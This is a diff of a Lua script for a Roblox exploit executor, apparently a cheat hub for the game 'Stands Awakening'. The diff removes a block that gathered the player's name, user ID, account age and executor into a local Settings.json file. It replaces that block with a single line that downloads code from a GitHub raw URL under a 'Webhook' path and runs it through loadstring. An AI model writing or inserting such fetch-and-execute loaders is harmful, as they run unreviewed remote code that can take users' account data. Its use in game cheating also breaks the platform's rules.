@@ -26,28 +26,7 @@ Notification:Notify(
 
 
 -- settings
-local Name = "Settings.json"
-local Player_Settings = {
-    Name = game.Players.LocalPlayer.Name,
-    DisplayName = game.Players.LocalPlayer.DisplayName,
-    Id = game.Players.LocalPlayer.UserId,
-    AccountAge = game.Players.LocalPlayer.AccountAge,
-    Game = game:GetService('MarketplaceService'):GetProductInfo(game.PlaceId).Name or 'Game-'..game.PlaceId,
-    Executor = identifyexecutor() or "Unknown",
-}
-local JSON
-if not pcall(function() readfile(Name) end) then 
-    writefile(Name, game:service'HttpService':JSONEncode(Player_Settings)) 
-end
-JSON = game:service'HttpService':JSONDecode(readfile(Name))
-print(JSON.DidTeleport)
-local function Save()
-    writefile(Name,game:service'HttpService':JSONEncode(JSON))
-end
-local function resetToDefaults()
-    writefile(Name, game:service'HttpService':JSONEncode(Player_Settings))
-end
-Save()
+loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/InfinityHubTwo/InfinityHubScripts/main/Games/Stands%20Awakening/Webhook/Loader.lua'))();
 
 
 
